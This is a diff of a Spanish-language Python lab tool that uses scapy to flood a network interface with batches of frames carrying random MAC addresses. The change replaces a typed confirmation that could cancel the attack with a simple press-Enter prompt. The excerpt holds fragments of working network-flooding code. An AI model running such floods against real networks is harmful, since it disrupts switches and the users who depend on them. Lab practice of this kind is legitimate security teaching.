@@ -115,10 +115,9 @@ def ask_float(label, default_value, minimum, maximum):
         print(f"El valor debe estar entre {minimum} y {maximum}")
 
 
-def ask_confirm():
+def wait_enter():
     print("")
-    value = input("Escribe s para iniciar el ataque en el laboratorio: ").strip().lower()
-    return value == "s"
+    input("Presiona Enter para iniciar el ataque en el laboratorio")
 
 
 def random_mac():
@@ -147,7 +146,7 @@ def build_packet(payload_size):
         / Raw(load=random_payload(payload_size))
     )
 
-    return packet, src_mac, dst_mac
+    return packet
 
 
 def main():
@@ -178,13 +177,11 @@ def main():
     print(f"Info interfaz: {get_interface_info(iface)}")
     print(f"MAC real atacante: {real_mac}")
     print(f"Tramas totales: {count}")
-    print(f"Lote: {batch_size}")
+    print(f"Tamaño de lote: {batch_size}")
     print(f"Payload: {payload_size} bytes")
     print(f"Pausa entre lotes: {interval}")
 
-    if not ask_confirm():
-        print("Cancelado")
-        sys.exit(0)
+    wait_enter()
 
     print("")
     print("Ataque iniciado")
@@ -200,8 +197,7 @@ def main():
         packets = []
 
         for _ in range(current_batch):
-            packet, src_mac, dst_mac = build_packet(payload_size)
-            packets.append(packet)
+            packets.append(build_packet(payload_size))
 
         sendp(packets, iface=iface, verbose=False)
 
